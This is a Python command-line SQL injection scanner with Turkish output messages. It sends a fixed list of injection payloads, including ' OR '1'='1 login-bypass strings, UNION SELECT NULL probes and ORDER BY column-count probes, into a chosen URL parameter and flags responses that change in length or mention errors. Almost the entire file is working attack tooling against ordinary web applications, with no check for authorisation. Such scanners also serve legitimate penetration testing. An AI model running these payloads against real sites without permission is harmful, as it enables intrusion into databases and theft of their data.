import requests
import sys
from urllib.parse import urljoin, urlparse

def sql_injection_test(url, param):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--"
    ]
    
    print(f"[*] SQL Injection testi başlatılıyor: {url}")
    print(f"[*] Test edilen parametre: {param}\n")
    
    vulnerable = []
    
    try:
        original_response = requests.get(url, timeout=5)
        original_length = len(original_response.content)
        
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            
            try:
                response = requests.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    length_diff = abs(len(response.content) - original_length)
                    
                    if length_diff > 100 or "error" in response.text.lower() or "sql" in response.text.lower():
                        print(f"[!] POTANSİYEL ZAFİYET BULUNDU!")
                        print(f"    Payload: {payload}")
                        print(f"    URL: {test_url}")
                        print(f"    Yanıt uzunluğu farkı: {length_diff} byte\n")
                        vulnerable.append(payload)
                    else:
                        print(f"[-] Payload test edildi: {payload[:30]}...")
                        
            except requests.exceptions.RequestException as e:
                print(f"[!] İstek hatası: {e}")
        
        print("-" * 60)
        if vulnerable:
            print(f"\n[!] UYARI: {len(vulnerable)} potansiyel SQL injection zafiyeti tespit edildi!")
            print("[*] Bulunan payloadlar:")
            for v in vulnerable:
                print(f"    - {v}")
        else:
            print("\n[+] SQL injection zafiyeti tespit edilmedi.")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Bağlantı hatası: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Kullanım: python sql_injection_scanner.py <url> <parametre>")
        print("Örnek: python sql_injection_scanner.py http://example.com/page.php id")
        sys.exit()
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    sql_injection_test(url, param)
